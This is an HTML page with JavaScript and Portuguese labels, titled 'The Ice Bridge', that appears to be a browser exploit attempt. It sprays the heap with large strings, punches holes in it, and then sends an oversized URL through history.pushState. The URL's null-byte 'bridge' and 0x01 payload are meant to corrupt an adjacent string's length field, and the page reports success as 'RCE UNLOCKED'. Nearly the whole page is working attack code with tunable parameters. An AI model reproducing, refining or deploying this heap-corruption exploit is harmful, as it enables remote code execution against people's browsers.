<!DOCTYPE html>
<html>
<head>
    <title>The Ice Bridge (Zero Bypass)</title>
    <style>
        body { background-color: #000; color: #00ffff; font-family: monospace; padding: 20px; }
        button { 
            font-size: 24px; padding: 20px; width: 100%; border: 2px solid #00ffff; background: #111; color: #fff; cursor: pointer; margin-bottom: 10px; 
        }
        #log { border: 1px solid #333; height: 400px; overflow-y: scroll; padding: 10px; color: cyan; font-size: 14px;}
        .win { background-color: #00ffff; color: #000; font-weight: bold; font-size: 1.5em; padding: 10px; }
    </style>
</head>
<body>

    <h1>The Ice Bridge (Ponte de Zeros)</h1>
    <p>Tentando neutralizar o StructureID com 0x00 para atingir o Length.</p>

    <button onclick="startIceBridge(4)">PONTE DE 4 BYTES (Cobre ID)</button>
    <button onclick="startIceBridge(8)">PONTE DE 8 BYTES (Cobre ID + Flags)</button>
    <button onclick="startIceBridge(12)">PONTE DE 12 BYTES</button>
    <button onclick="startIceBridge(16)">PONTE DE 16 BYTES</button>

    <div id="log">Pronto. Reinicie o console.</div>

    <script>
        const BASE_OFFSET = 709522; // O último byte seguro antes do muro
        const OVERFLOW_AMT = 1024 * 64; 

        // Alvo: 1MB TextDecoder (O que sabemos que alinha)
        const TARGET_SIZE = 1024 * 1024; 
        const PAYLOAD_SIZE = TARGET_SIZE - 24; 

        var victims = [];

        function log(msg, type) {
            const el = document.getElementById('log');
            let cls = type === 'win' ? 'class="win"' : '';
            el.innerHTML += `<div ${cls}>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
            el.scrollTop = el.scrollHeight;
        }

        async function startIceBridge(zeroCount) {
            log(`--- TESTANDO PONTE DE ${zeroCount} ZEROS ---`);
            
            // 1. PREPARAR HEAP (Spray de Sucesso)
            victims = [];
            await forceGC();

            try {
                let rawBuffer = new Uint8Array(PAYLOAD_SIZE);
                rawBuffer.fill(0x42); 
                let decoder = new TextDecoder("utf-8");
                let baseString = decoder.decode(rawBuffer);

                const SPRAY_COUNT = 80;
                for(let i=0; i<SPRAY_COUNT; i++) {
                    let s = i + "_" + baseString.substring((i+"_").length);
                    victims.push(s);
                }

                // Buracos
                for(let i=0; i<SPRAY_COUNT; i+=2) victims[i] = null;
                await forceGC();

                // 2. EXPLOIT COM PONTE
                log("Disparando Overflow com Zeros...");
                setTimeout(() => {
                    try {
                        // A: Base Segura
                        let buffer = "A".repeat(BASE_OFFSET);
                        
                        // B: A Ponte (Zeros para acalmar o StructureID)
                        // \u0000 é 1 byte em strings 8-bit
                        buffer += "\u0000".repeat(zeroCount); 
                        
                        // C: A Carga (0x01 para corromper o Length que vem depois)
                        buffer += "\x01".repeat(OVERFLOW_AMT);
                        
                        history.pushState({}, "ice_pwn", "/" + buffer);

                        checkVictims(PAYLOAD_SIZE, zeroCount);

                    } catch (e) {
                        log("Erro: " + e.message);
                    }
                }, 500);

            } catch(e) {
                log("Erro Memória: " + e.message);
            }
        }

        function checkVictims(expectedLen, zCount) {
            let success = false;
            for(let i=1; i<victims.length; i+=2) {
                let s = victims[i];
                if(!s) continue;

                try {
                    let err = new Error(s);
                    let msg = err.message;

                    // SUCESSO (RCE)
                    if (msg.length !== expectedLen) {
                        log(`!!! JACKPOT !!! Length Corrompido com ${zCount} zeros!`, 'win');
                        log(`Novo Tamanho: ${msg.length}`, 'win');
                        alert("RCE UNLOCKED!");
                        success = true;
                        break;
                    }

                    // Se vimos dados corrompidos, o zero passou mas não pegou o length
                    if (msg.charCodeAt(0) === 1) {
                         log(`[Aviso] Atingiu DADOS. A ponte de ${zCount} zeros foi curta demais?`);
                    }
                    
                } catch(e) {}
            }
            if(!success) log("Nada aconteceu. Tente outra ponte.");
        }

        async function forceGC() {
            try { new ArrayBuffer(50 * 1024 * 1024); } catch(e){}
            return new Promise(r => setTimeout(r, 800));
        }
    </script>
</body>
</html>
